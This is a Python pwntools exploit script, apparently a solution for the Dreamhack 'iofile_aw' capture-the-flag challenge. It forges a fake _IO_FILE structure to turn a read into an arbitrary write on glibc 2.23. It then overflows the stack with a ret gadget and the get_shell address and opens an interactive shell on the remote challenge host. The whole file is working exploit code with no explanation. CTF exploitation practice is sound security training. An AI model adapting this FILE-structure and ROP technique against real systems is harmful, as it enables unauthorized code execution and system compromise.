#!/usr/bin/env python3

from pwn import *

exe = ELF("./iofile_aw_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 20701)

    return r


def main():
    r = conn()

    payload = p64(0xfbad2488)                               # _flags
    payload += p64(0)                                       # _IO_read_ptr
    payload += p64(0)                                       # _IO_read_end
    payload += p64(0)                                       # _IO_read_base
    payload += p64(0)                                       # _IO_write_base
    payload += p64(0)                                       # _IO_write_ptr
    payload += p64(0)                                       # _IO_write_end
    payload += p64(exe.symbols["size"])                     # _IO_buf_base

    r.sendafter(b"# ", b"printf " + payload + b"\x00")
    r.sendafter(b"# ", b"read\x00")
    sleep(0.5)
    r.send(p64(0x400) + b"\n")
    
    payload2 = b"A" * 0x228
    payload2 += p64(ROP(exe).find_gadget(["ret"])[0])
    payload2 += p64(exe.symbols["get_shell"])

    r.sendafter(b"# ", payload2)
    r.sendafter(b"# ", b"exit\x00")

    r.interactive()


if __name__ == "__main__":
    main()
